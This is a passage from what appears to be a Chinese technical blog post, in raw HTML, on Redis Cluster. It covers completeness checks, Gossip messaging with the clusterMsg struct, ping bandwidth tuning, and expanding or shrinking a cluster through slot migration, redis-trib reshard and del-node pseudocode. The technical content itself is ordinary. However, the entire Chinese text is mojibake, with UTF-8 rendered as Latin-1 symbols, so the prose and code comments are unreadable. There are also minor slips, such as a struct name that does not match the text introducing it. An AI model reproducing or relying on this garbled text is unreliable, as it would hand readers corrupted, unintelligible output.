æ­¤å¯ä»¥é€šè¿‡<code>redis-trib.rb</code>æ¥æ­å»ºé›†ç¾¤ï¼Œè¯¥å·¥å…·æ”¯æŒé›†ç¾¤åˆ›å»ºã€æ£€æŸ¥ã€ä¿®å¤ã€å‡è¡¡ç­‰å‘½ä»¤è¡Œå·¥å…·ã€‚</p><p>å½“é›†ç¾¤åˆ›å»ºå®Œæˆåï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œå®Œæ•´æ€§æ£€æŸ¥ã€‚é›†ç¾¤å®Œæ•´æ€§æŒ‡æ‰€æœ‰çš„æ§½éƒ½åˆ†é…åˆ°å­˜æ´»çš„ä¸»èŠ‚ç‚¹ä¸Šï¼Œåªè¦16384ä¸ªæ§½ä¸­æœ‰ä¸€ä¸ªæ²¡æœ‰åˆ†é…ç»™èŠ‚ç‚¹åˆ™è¡¨ç¤ºé›†ç¾¤ä¸å®Œæ•´ã€‚å¯ä»¥ä½¿ç”¨<code>redis-trib.rb check</code>å‘½ä»¤æ£€æµ‹ä¹‹å‰åˆ›å»ºçš„ä¸¤ä¸ªé›†ç¾¤æ˜¯å¦æˆåŠŸï¼Œ<code>check</code>å‘½ä»¤åªéœ€è¦ç»™å‡ºé›†ç¾¤ä¸­ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹åœ°å€å°±å¯ä»¥å®Œæˆæ•´ä¸ªé›†ç¾¤çš„æ£€æŸ¥å·¥ä½œã€‚å½“æŒæœ‰æ§½çš„ä¸»èŠ‚ç‚¹ä¸‹çº¿æ—¶ï¼Œä»æ•…éšœå‘ç°åˆ°è‡ªåŠ¨å®Œæˆè½¬ç§»æœŸé—´æ•´ä¸ªé›†ç¾¤æ˜¯ä¸å¯ç”¨çŠ¶æ€ï¼Œå¯¹äºå¤§å¤šæ•°ä¸šåŠ¡æ— æ³•å®¹å¿è¿™ç§æƒ…å†µï¼Œå› æ­¤å»ºè®®å°†å‚æ•°<code>cluster-require-full-coverage</code>é…ç½®ä¸ºnoï¼Œå½“ä¸»èŠ‚ç‚¹æ•…éšœæ—¶åªå½±å“å®ƒè´Ÿè´£æ§½çš„ç›¸å…³å‘½ä»¤æ‰§è¡Œï¼Œä¸ä¼šå½±å“å…¶ä»–ä¸»èŠ‚ç‚¹çš„å¯ç”¨æ€§ã€‚</p><h2 id="èŠ‚ç‚¹é€šä¿¡"><a href="#èŠ‚ç‚¹é€šä¿¡" class="headerlink" title="èŠ‚ç‚¹é€šä¿¡"></a>èŠ‚ç‚¹é€šä¿¡</h2><p>å¸¸è§çš„å…ƒæ•°æ®ç»´æŠ¤æ–¹å¼åˆ†ä¸ºï¼šé›†ä¸­å¼å’ŒP2Pæ–¹å¼ã€‚Redisé›†ç¾¤é‡‡ç”¨P2Pçš„Gossipï¼ˆæµè¨€ï¼‰åè®®ï¼ŒGossipåè®®å·¥ä½œåŸç†å°±æ˜¯èŠ‚ç‚¹å½¼æ­¤ä¸æ–­é€šä¿¡äº¤æ¢ä¿¡æ¯ï¼Œä¸€æ®µæ—¶é—´åæ‰€æœ‰çš„èŠ‚ç‚¹éƒ½ä¼šçŸ¥é“é›†ç¾¤å®Œæ•´çš„ä¿¡æ¯ï¼Œè¿™ç§æ–¹å¼ç±»ä¼¼æµè¨€ä¼ æ’­ã€‚å…¶é€šä¿¡è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>é›†ç¾¤ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šå•ç‹¬å¼€è¾Ÿä¸€ä¸ªTCPé€šé“ï¼Œç”¨äºèŠ‚ç‚¹ä¹‹é—´å½¼æ­¤é€šä¿¡ï¼Œé€šä¿¡ç«¯å£å·åœ¨åŸºç¡€ç«¯å£ä¸ŠåŠ 10000ã€‚</li><li>æ¯ä¸ªèŠ‚ç‚¹åœ¨å›ºå®šå‘¨æœŸå†…é€šè¿‡ç‰¹å®šè§„åˆ™é€‰æ‹©å‡ ä¸ªèŠ‚ç‚¹å‘é€pingæ¶ˆæ¯ã€‚</li><li>æ¥æ”¶åˆ°pingæ¶ˆæ¯çš„èŠ‚ç‚¹ç”¨pongæ¶ˆæ¯ä½œä¸ºå“åº”ã€‚</li></ol><blockquote><p>æˆ‘ä»¬ç»å¸¸åœ¨ç½‘ç»œä¸­ä½¿ç”¨ ping ä½œä¸ºæ¢æ´»å‘½ä»¤ï¼Œä½¿ç”¨ pong ä½œä¸ºå“åº”ï¼Œè¿™ä¸ªä¸¤ä¸ªè¯åœ¨ä¸€æ¬¡æ­£å¥½ä¸º ping-pong ä¹’ä¹“çƒï¼Œå¯ä»¥ç†è§£ä¸ºå‘é€æ–¹å‘å‡ºå»çš„çƒå¾—åˆ°å“åº”æ‰è®¤ä¸ºå¯¹æ–¹å­˜æ´»ã€‚ä¸çŸ¥é“åˆ›å»ºè¿™ä¸€å¯¹å‘½ä»¤çš„äººæ˜¯å¦ä¹Ÿæ˜¯åŸºäºè¿™ä¸ªç†å¿µåˆ›å»ºçš„ã€‚</p></blockquote><p>å¸¸ç”¨çš„Gossipæ¶ˆæ¯å¯åˆ†ä¸ºï¼špingæ¶ˆæ¯ã€pongæ¶ˆæ¯ã€meetæ¶ˆæ¯ã€failæ¶ˆæ¯ç­‰ã€‚</p><ul><li>meet æ¶ˆæ¯ï¼šç”¨äºé€šçŸ¥æ–°èŠ‚ç‚¹åŠ å…¥</li><li>ping æ¶ˆæ¯ï¼šç”¨äºæ£€æµ‹èŠ‚ç‚¹æ˜¯å¦åœ¨çº¿å’Œäº¤æ¢å½¼æ­¤çŠ¶æ€ä¿¡æ¯ã€‚ping æ¶ˆæ¯å‘é€å°è£…äº†è‡ªèº«èŠ‚ç‚¹å’Œéƒ¨åˆ†å…¶ä»–èŠ‚ç‚¹çš„çŠ¶æ€æ•°æ®ã€‚</li><li>pong æ¶ˆæ¯ï¼šä½œä¸ºå“åº”æ¶ˆæ¯å›å¤ç»™å‘é€æ–¹ç¡®è®¤æ¶ˆæ¯æ­£å¸¸é€šä¿¡ã€‚pongæ¶ˆæ¯å†…éƒ¨å°è£…äº†è‡ªèº«çŠ¶æ€æ•°æ®ã€‚èŠ‚ç‚¹ä¹Ÿå¯ä»¥å‘é›†ç¾¤å†…å¹¿æ’­è‡ªèº«çš„pongæ¶ˆæ¯æ¥é€šçŸ¥æ•´ä¸ªé›†ç¾¤å¯¹è‡ªèº«çŠ¶æ€è¿›è¡Œæ›´æ–°ã€‚</li><li>fail æ¶ˆæ¯ï¼šå½“èŠ‚ç‚¹åˆ¤å®šé›†ç¾¤å†…å¦ä¸€ä¸ªèŠ‚ç‚¹ä¸‹çº¿æ—¶ï¼Œä¼šå‘é›†ç¾¤å†…å¹¿æ’­ä¸€ä¸ªfailæ¶ˆæ¯ï¼Œå…¶ä»–èŠ‚ç‚¹æ¥æ”¶åˆ°failæ¶ˆæ¯ä¹‹åæŠŠå¯¹åº”èŠ‚ç‚¹æ›´æ–°ä¸ºä¸‹çº¿çŠ¶æ€ã€‚</li></ul><p>æ‰€æœ‰æ¶ˆæ¯æ ¼å¼åˆ’åˆ†ä¸ºæ¶ˆæ¯å¤´å’Œæ¶ˆæ¯ä½“ã€‚æ¶ˆæ¯å¤´åŒ…å«å‘é€èŠ‚ç‚¹è‡ªèº«çŠ¶æ€æ•°æ®ï¼ˆå¦‚èŠ‚ç‚¹idã€æ§½æ˜ å°„ã€èŠ‚ç‚¹æ ‡è¯†ï¼ˆä¸»ä»è§’è‰²ï¼Œæ˜¯å¦ä¸‹çº¿ï¼‰ç­‰ï¼‰ï¼Œæ¥æ”¶èŠ‚ç‚¹æ ¹æ®æ¶ˆæ¯å¤´å°±å¯ä»¥è·å–åˆ°å‘é€èŠ‚ç‚¹çš„ç›¸å…³æ•°æ®ï¼›æ¶ˆæ¯ä½“åˆ™åŒ…å«äº†å‘é€èŠ‚ç‚¹æ‰€äº†è§£çš„å…¶ä»–èŠ‚ç‚¹ä¿¡æ¯ã€‚æ¶ˆæ¯çš„ç±»å‹åˆ™æ ¹æ®æ¶ˆæ¯å¤´çš„ type å±æ€§åŒºåˆ†ã€‚</p><p>æ¶ˆæ¯å¤´ç»“æ„ clusterMsg å¦‚ä¸‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> sig[<span class="number">4</span>]; <span class="comment">/* ä¿¡å·æ ‡ç¤º */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> totlen; <span class="comment">/* æ¶ˆæ¯æ€»é•¿åº¦ */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ver; <span class="comment">/* åè®®ç‰ˆæœ¬*/</span></span><br><span class="line">    <span class="keyword">uint16_t</span> type; <span class="comment">/* æ¶ˆæ¯ç±»å‹,ç”¨äºåŒºåˆ†meet,ping,pongç­‰æ¶ˆæ¯ */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> count; <span class="comment">/* æ¶ˆæ¯ä½“åŒ…å«çš„èŠ‚ç‚¹æ•°é‡ï¼Œä»…ç”¨äºmeet,ping,pingæ¶ˆæ¯ç±»å‹*/</span></span><br><span class="line">    <span class="keyword">uint64_t</span> currentEpoch; <span class="comment">/* å½“å‰å‘é€èŠ‚ç‚¹çš„é…ç½®çºªå…ƒ */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> configEpoch; <span class="comment">/* ä¸»èŠ‚ç‚¹/ä»èŠ‚ç‚¹çš„ä¸»èŠ‚ç‚¹é…ç½®çºªå…ƒ */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> offset; <span class="comment">/* å¤åˆ¶åç§»é‡ */</span></span><br><span class="line">    <span class="keyword">char</span> sender[CLUSTER_NAMELEN]; <span class="comment">/* å‘é€èŠ‚ç‚¹çš„nodeId */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> myslots[CLUSTER_SLOTS/<span class="number">8</span>]; <span class="comment">/* å‘é€èŠ‚ç‚¹è´Ÿè´£çš„æ§½ä¿¡æ¯ */</span></span><br><span class="line">    <span class="keyword">char</span> slaveof[CLUSTER_NAMELEN]; <span class="comment">/* å¦‚æœå‘é€èŠ‚ç‚¹æ˜¯ä»èŠ‚ç‚¹ï¼Œè®°å½•å¯¹åº”ä¸»èŠ‚ç‚¹çš„nodeId */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> port; <span class="comment">/* ç«¯å£å· */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> flags; <span class="comment">/* å‘é€èŠ‚ç‚¹æ ‡è¯†,åŒºåˆ†ä¸»ä»è§’è‰²ï¼Œæ˜¯å¦ä¸‹çº¿ç­‰ */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> state; <span class="comment">/* å‘é€èŠ‚ç‚¹æ‰€å¤„çš„é›†ç¾¤çŠ¶æ€ */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> mflags[<span class="number">3</span>]; <span class="comment">/* æ¶ˆæ¯æ ‡è¯† */</span></span><br><span class="line">    <span class="keyword">union</span> clusterMsgData data <span class="comment">/* æ¶ˆæ¯æ­£æ–‡ */</span>;</span><br><span class="line">&#125; clusterMsg;</span><br></pre></td></tr></table></figure><p>æ¶ˆæ¯ä½“ clusterMsgData ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> nodename[CLUSTER_NAMELEN]; <span class="comment">/* èŠ‚ç‚¹çš„nodeId */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ping_sent; <span class="comment">/* æœ€åä¸€æ¬¡å‘è¯¥èŠ‚ç‚¹å‘é€pingæ¶ˆæ¯æ—¶é—´ */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> pong_received; <span class="comment">/* æœ€åä¸€æ¬¡æ¥æ”¶è¯¥èŠ‚ç‚¹pongæ¶ˆæ¯æ—¶é—´ */</span></span><br><span class="line">    <span class="keyword">char</span> ip[NET_IP_STR_LEN]; <span class="comment">/* IP */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> port; <span class="comment">/* port*/</span></span><br><span class="line">    <span class="keyword">uint16_t</span> flags; <span class="comment">/* è¯¥èŠ‚ç‚¹æ ‡è¯†, */</span></span><br><span class="line">&#125; clusterMsgDataGossip;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9ic768uakj30ho0m8jve.jpg" alt=""></p><p>å¦‚æœèŠ‚ç‚¹é—´é¢‘ç¹é€šä¿¡ï¼Œåˆ™ä¼šåŠ é‡å¸¦å®½å’Œè®¡ç®—çš„è´Ÿæ‹…ï¼Œè¿‡æ…¢åˆä¼šå¯¼è‡´ä¿¡æ¯æ›´æ–°ä¸åŠæ—¶ï¼Œå› æ­¤æ­¤Redisé›†ç¾¤çš„Gossipåè®®éœ€è¦å…¼é¡¾ä¿¡æ¯äº¤æ¢å®æ—¶æ€§å’Œæˆæœ¬å¼€é”€ã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9icdly6hpj30j30ebq5o.jpg" alt=""></p><p>ä»Gossipçš„é€šä¿¡æœºåˆ¶ä¸­æˆ‘ä»¬çœ‹åˆ°ï¼Œå½±å“å¸¦å®½çš„ä¸»è¦å› ç´ åœ¨äºé€šä¿¡çš„èŠ‚ç‚¹æ•°ä¸å‘é€çš„æ¶ˆæ¯æ•°æ®é‡ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬ä»è¿™ä¸¤æ–¹é¢è¿›è¡Œä¼˜åŒ–ï¼š</p><ul><li>é€‰æ‹©å‘é€æ¶ˆæ¯çš„èŠ‚ç‚¹æ•°é‡ï¼šé›†ç¾¤å†…æ¯ä¸ªèŠ‚ç‚¹ç»´æŠ¤å®šæ—¶ä»»åŠ¡é»˜è®¤æ¯ç§’æ‰§è¡Œ10æ¬¡ï¼Œæ¯ç§’ä¼šéšæœºé€‰å–5ä¸ªèŠ‚ç‚¹æ‰¾å‡ºæœ€ä¹…æ²¡æœ‰é€šä¿¡çš„èŠ‚ç‚¹å‘é€pingæ¶ˆæ¯ï¼Œç”¨äºä¿è¯Gossipä¿¡æ¯äº¤æ¢çš„éšæœºæ€§ã€‚æ¯100æ¯«ç§’éƒ½ä¼šæ‰«ææœ¬åœ°èŠ‚ç‚¹åˆ—è¡¨ï¼Œå¦‚æœå‘ç°èŠ‚ç‚¹æœ€è¿‘ä¸€æ¬¡æ¥å—pongæ¶ˆæ¯çš„æ—¶é—´å¤§äº<code>cluster_node_timeout/2</code>ï¼Œåˆ™ç«‹åˆ»å‘é€pingæ¶ˆæ¯ï¼Œé˜²æ­¢è¯¥èŠ‚ç‚¹ä¿¡æ¯å¤ªé•¿æ—¶é—´æœªæ›´æ–°ã€‚æ ¹æ®ä»¥ä¸Šè§„åˆ™å¾—å‡ºæ¯ä¸ªèŠ‚ç‚¹æ¯ç§’éœ€è¦å‘é€pingæ¶ˆæ¯çš„æ•°é‡<code>=1+10*numï¼ˆnode.pong_received&gt;cluster_node_timeout/2</code>ï¼Œå› æ­¤<code>cluster_node_timeout</code>å‚æ•°å¯¹æ¶ˆæ¯å‘é€çš„èŠ‚ç‚¹æ•°é‡å½±å“éå¸¸å¤§ã€‚å½“æˆ‘ä»¬çš„å¸¦å®½èµ„æºç´§å¼ æ—¶ï¼Œå¯ä»¥é€‚å½“è°ƒå¤§è¿™ä¸ªå‚æ•°ã€‚</li><li>æ¶ˆæ¯æ•°æ®é‡ï¼šæ¶ˆæ¯å¤´ä¸»è¦å ç”¨ç©ºé—´çš„å­—æ®µæ˜¯<code>myslots[CLUSTER_SLOTS/8]</code>ï¼Œå ç”¨2KBï¼Œè¿™å—ç©ºé—´å ç”¨ç›¸å¯¹å›ºå®šã€‚æ¶ˆæ¯ä½“æºå¸¦æ•°æ®é‡è·Ÿé›†ç¾¤çš„èŠ‚ç‚¹æ•°æ¯æ¯ç›¸å…³ï¼Œæ›´å¤§çš„é›†ç¾¤æ¯æ¬¡æ¶ˆæ¯é€šä¿¡çš„æˆæœ¬ä¹Ÿå°±æ›´é«˜ï¼Œå› æ­¤å¯¹äºRedisé›†ç¾¤æ¥è¯´å¹¶ä¸æ˜¯å¤§è€Œå…¨çš„é›†ç¾¤æ›´å¥½ã€‚</li></ul><h2 id="é›†ç¾¤ä¼¸ç¼©"><a href="#é›†ç¾¤ä¼¸ç¼©" class="headerlink" title="é›†ç¾¤ä¼¸ç¼©"></a>é›†ç¾¤ä¼¸ç¼©</h2><p>é›†ç¾¤çš„æ°´å¹³ä¼¸ç¼©çš„ä¸Šå±‚åŸç†ï¼š<strong>é›†ç¾¤ä¼¸ç¼© = æ§½å’Œæ•°æ®åœ¨èŠ‚ç‚¹ä¹‹é—´çš„ç§»åŠ¨</strong>ã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9icgp2fv1j30ju0gwtcv.jpg" alt=""></p><h3 id="æ‰©å®¹é›†ç¾¤"><a href="#æ‰©å®¹é›†ç¾¤" class="headerlink" title="æ‰©å®¹é›†ç¾¤"></a>æ‰©å®¹é›†ç¾¤</h3><p>æ§½è¿ç§»æ•°æ®æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>å¯¹ç›®æ ‡èŠ‚ç‚¹å‘é€<code>cluster setslot {slot} importing {sourceNodeId}</code>å‘½ä»¤ï¼Œè®©ç›®æ ‡èŠ‚ç‚¹å‡†å¤‡å¯¼å…¥æ§½çš„æ•°æ®ã€‚</li><li>å¯¹æºèŠ‚ç‚¹å‘é€<code>cluster setslot {slot} migrating {targetNodeId}</code>å‘½ä»¤ï¼Œè®©æºèŠ‚ç‚¹å‡†å¤‡è¿å‡ºæ§½çš„æ•°æ®ã€‚</li><li>æºèŠ‚ç‚¹å¾ªç¯æ‰§è¡Œ<code>cluster getkeysinslot {slot} {count}</code>å‘½ä»¤ï¼Œè·å–countä¸ªå±äºæ§½{slot}çš„é”®ã€‚</li><li>åœ¨æºèŠ‚ç‚¹ä¸Šæ‰§è¡Œ<code>migrate {targetIp} {targetPort} &quot;&quot; 0 {timeout} keys {keys...}</code>å‘½ä»¤ï¼ŒæŠŠè·å–çš„é”®é€šè¿‡æµæ°´çº¿æœºåˆ¶æ‰¹é‡è¿ç§»åˆ°ç›®æ ‡èŠ‚ç‚¹ã€‚</li><li>é‡å¤æ‰§è¡Œæ­¥éª¤3å’Œæ­¥éª¤4ç›´åˆ°æ§½ä¸‹æ‰€æœ‰çš„é”®å€¼æ•°æ®è¿ç§»åˆ°ç›®æ ‡èŠ‚ç‚¹ã€‚</li><li>å‘é›†ç¾¤å†…æ‰€æœ‰ä¸»èŠ‚ç‚¹å‘é€<code>cluster setslot {slot} node {targetNodeId}</code>å‘½ä»¤ï¼Œé€šçŸ¥æ§½åˆ†é…ç»™ç›®æ ‡èŠ‚ç‚¹ã€‚ä¸ºäº†ä¿è¯æ§½èŠ‚ç‚¹æ˜ å°„å˜æ›´åŠæ—¶ä¼ æ’­ï¼Œéœ€è¦éå†å‘é€ç»™æ‰€æœ‰ä¸»èŠ‚ç‚¹æ›´æ–°è¢«è¿ç§»çš„æ§½æŒ‡å‘æ–°èŠ‚ç‚¹ã€‚</li></ol><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9jh857qqpj30ji0ehq6u.jpg" alt=""></p><p><code>redis-trib</code>æ§½é‡åˆ†ç‰‡åŠŸèƒ½å‘½ä»¤å¦‚ä¸‹ï¼š<code>redis-trib.rb reshard host:port --from &lt;arg&gt; --to &lt;arg&gt; --slots &lt;arg&gt; --yes --timeout &lt;arg&gt; --pipeline &lt;arg&gt;</code></p><ul><li><code>host:port</code>ï¼šå¿…ä¼ å‚æ•°ï¼Œé›†ç¾¤å†…ä»»æ„èŠ‚ç‚¹åœ°å€ï¼Œç”¨æ¥è·å–æ•´ä¸ªé›†ç¾¤ä¿¡æ¯ã€‚</li><li><code>--from</code>ï¼šåˆ¶å®šæºèŠ‚ç‚¹çš„idï¼Œå¦‚æœæœ‰å¤šä¸ªæºèŠ‚ç‚¹ï¼Œä½¿ç”¨é€—å·åˆ†éš”ï¼Œå¦‚æœæ˜¯allæºèŠ‚ç‚¹å˜ä¸ºé›†ç¾¤å†…æ‰€æœ‰ä¸»èŠ‚ç‚¹ï¼Œåœ¨è¿ç§»è¿‡ç¨‹ä¸­æç¤ºç”¨æˆ·è¾“å…¥ã€‚</li><li><code>--to</code>ï¼šéœ€è¦è¿ç§»çš„ç›®æ ‡èŠ‚ç‚¹çš„idï¼Œç›®æ ‡èŠ‚ç‚¹åªèƒ½å¡«å†™ä¸€ä¸ªï¼Œåœ¨è¿ç§»è¿‡ç¨‹ä¸­æç¤ºç”¨æˆ·è¾“å…¥ã€‚</li><li><code>--slots</code>ï¼šéœ€è¦è¿ç§»æ§½çš„æ€»æ•°é‡ï¼Œåœ¨è¿ç§»è¿‡ç¨‹ä¸­æç¤ºç”¨æˆ·è¾“å…¥ã€‚</li><li><code>--yes</code>ï¼šå½“æ‰“å°å‡ºreshardæ‰§è¡Œè®¡åˆ’æ—¶ï¼Œæ˜¯å¦éœ€è¦ç”¨æˆ·è¾“å…¥yesç¡®è®¤åå†æ‰§è¡Œ<code>reshard</code>ã€‚</li><li><code>--timeout</code>ï¼šæ§åˆ¶æ¯æ¬¡migrateæ“ä½œçš„è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤ä¸º60000æ¯«ç§’ã€‚</li><li><code>--pipeline</code>ï¼šæ§åˆ¶æ¯æ¬¡æ‰¹é‡è¿ç§»é”®çš„æ•°é‡ï¼Œé»˜è®¤ä¸º10ã€‚</li></ul><p>è¿ç§»ä¹‹åå»ºè®®ä½¿ç”¨<code>redis-trib.rb rebalance</code>å‘½ä»¤æ£€æŸ¥èŠ‚ç‚¹ä¹‹é—´æ§½çš„å‡è¡¡æ€§ã€‚</p><h3 id="æ”¶ç¼©é›†ç¾¤"><a href="#æ”¶ç¼©é›†ç¾¤" class="headerlink" title="æ”¶ç¼©é›†ç¾¤"></a>æ”¶ç¼©é›†ç¾¤</h3><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9jhell5zkj30gy0hc417.jpg" alt=""></p><ol><li>é¦–å…ˆéœ€è¦ç¡®å®šä¸‹çº¿èŠ‚ç‚¹æ˜¯å¦æœ‰è´Ÿè´£çš„æ§½ï¼Œå¦‚æœæ˜¯ï¼Œéœ€è¦æŠŠæ§½è¿ç§»åˆ°å…¶ä»–èŠ‚ç‚¹ï¼Œä¿è¯èŠ‚ç‚¹ä¸‹çº¿åæ•´ä¸ªé›†ç¾¤æ§½èŠ‚ç‚¹æ˜ å°„çš„å®Œæ•´æ€§ã€‚</li><li>å½“ä¸‹çº¿èŠ‚ç‚¹ä¸å†è´Ÿè´£æ§½æˆ–è€…æœ¬èº«æ˜¯ä»èŠ‚ç‚¹æ—¶ï¼Œå°±å¯ä»¥é€šçŸ¥é›†ç¾¤å†…å…¶ä»–èŠ‚ç‚¹å¿˜è®°ä¸‹çº¿èŠ‚ç‚¹ï¼Œå½“æ‰€æœ‰çš„èŠ‚ç‚¹å¿˜è®°è¯¥èŠ‚ç‚¹åå¯ä»¥æ­£å¸¸å…³é—­ã€‚</li></ol><p>ä¸‹çº¿èŠ‚ç‚¹éœ€è¦æŠŠè‡ªå·±è´Ÿè´£çš„æ§½è¿ç§»åˆ°å…¶ä»–èŠ‚ç‚¹ï¼ŒåŸç†ä¸ä¹‹å‰èŠ‚ç‚¹æ‰©å®¹çš„è¿ç§»æ§½è¿‡ç¨‹ä¸€è‡´ã€‚åœ¨æ­¤ä¸åšèµ˜è¿°ã€‚</p><p>ç”±äºé›†ç¾¤å†…çš„èŠ‚ç‚¹ä¸åœåœ°é€šè¿‡Gossipæ¶ˆæ¯å½¼æ­¤äº¤æ¢èŠ‚ç‚¹çŠ¶æ€ï¼Œå› æ­¤éœ€è¦é€šè¿‡ä¸€ç§å¥å£®çš„æœºåˆ¶è®©é›†ç¾¤å†…æ‰€æœ‰èŠ‚ç‚¹å¿˜è®°ä¸‹çº¿çš„èŠ‚ç‚¹ã€‚ä¹Ÿå°±æ˜¯è¯´è®©å…¶ä»–èŠ‚ç‚¹ä¸å†ä¸è¦ä¸‹çº¿èŠ‚ç‚¹è¿›è¡ŒGossipæ¶ˆæ¯äº¤æ¢ã€‚Redisæä¾›äº†<code>cluster forget{downNodeId}</code>å‘½ä»¤å®ç°è¯¥åŠŸèƒ½ï¼Œï¼ˆæ­¤å¤„çš„Gossipå¯¹å¿˜è®°èŠ‚ç‚¹é€ æˆäº†é˜»ç¢ï¼‰</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9jhkc00w3j30he0b3q5k.jpg" alt=""></p><p>å½“èŠ‚ç‚¹æ¥æ”¶åˆ°<code>cluster forget{down NodeId}</code>å‘½ä»¤åï¼Œä¼šæŠŠnodeIdæŒ‡å®šçš„èŠ‚ç‚¹åŠ å…¥åˆ°ç¦ç”¨åˆ—è¡¨ä¸­ï¼Œåœ¨ç¦ç”¨åˆ—è¡¨å†…çš„èŠ‚ç‚¹ä¸å†å‘é€Gossipæ¶ˆæ¯ã€‚ç¦ç”¨åˆ—è¡¨æœ‰æ•ˆæœŸæ˜¯60ç§’ï¼Œè¶…è¿‡60ç§’èŠ‚ç‚¹ä¼šå†æ¬¡å‚ä¸æ¶ˆæ¯äº¤æ¢ã€‚ä¹Ÿå°±æ˜¯è¯´å½“ç¬¬ä¸€æ¬¡forgetå‘½ä»¤å‘å‡ºåï¼Œæˆ‘ä»¬æœ‰60ç§’çš„æ—¶é—´è®©é›†ç¾¤å†…çš„æ‰€æœ‰èŠ‚ç‚¹å¿˜è®°ä¸‹çº¿èŠ‚ç‚¹ã€‚çº¿ä¸Šæ“ä½œä¸å»ºè®®ç›´æ¥ä½¿ç”¨<code>cluster forget</code>å‘½ä»¤ä¸‹çº¿èŠ‚ç‚¹ï¼Œéœ€è¦è·Ÿå¤§é‡èŠ‚ç‚¹å‘½ä»¤äº¤äº’ï¼Œå®é™…æ“ä½œèµ·æ¥è¿‡äºç¹çå¹¶ä¸”å®¹æ˜“é—æ¼forgetèŠ‚ç‚¹ã€‚å»ºè®®ä½¿ç”¨<code>redistrib.rb del-node{host:port}{downNodeId}</code>å‘½ä»¤ï¼Œå†…éƒ¨å®ç°çš„ä¼ªä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def delnode_cluster_cmd(downNode):</span><br><span class="line">    <span class="comment"># ä¸‹çº¿èŠ‚ç‚¹ä¸å…è®¸åŒ…å«slots</span></span><br><span class="line">    <span class="keyword">if</span> downNode.slots.length != <span class="number">0</span></span><br><span class="line">        <span class="keyword">exit</span> <span class="number">1</span></span><br><span class="line">    end</span><br><span class="line">    <span class="comment"># å‘é›†ç¾¤å†…èŠ‚ç‚¹å‘é€cluster forget</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> nodes:</span><br><span class="line">        <span class="keyword">if</span> n.id == downNode.id:</span><br><span class="line">            <span class="comment"># ä¸èƒ½å¯¹è‡ªå·±åšforgetæ“ä½œ</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment"># å¦‚æœä¸‹çº¿èŠ‚ç‚¹æœ‰ä»èŠ‚ç‚¹åˆ™æŠŠä»èŠ‚ç‚¹æŒ‡å‘å…¶ä»–ä¸»èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span> n.replicate &amp;&amp; n.replicate.nodeId == downNode.id :</span><br><span class="line">            <span class="comment"># æŒ‡å‘æ‹¥æœ‰æœ€å°‘ä»èŠ‚ç‚¹çš„ä¸»èŠ‚ç‚¹</span></span><br><span class="line">            master = get_master_with_least_replicas();</span><br><span class="line">            n.cluster(<span class="string">"replicate"</span>,master.nodeId);</span><br><span class="line">        <span class="comment">#å‘é€å¿˜è®°èŠ‚ç‚¹å‘½ä»¤</span></span><br><span class="line">        n.cluster(<span class="string">'forget'</span>,downNode.id)</span><br><span class="line"><span class="comment"># èŠ‚ç‚¹å…³é—­</span></span><br><span 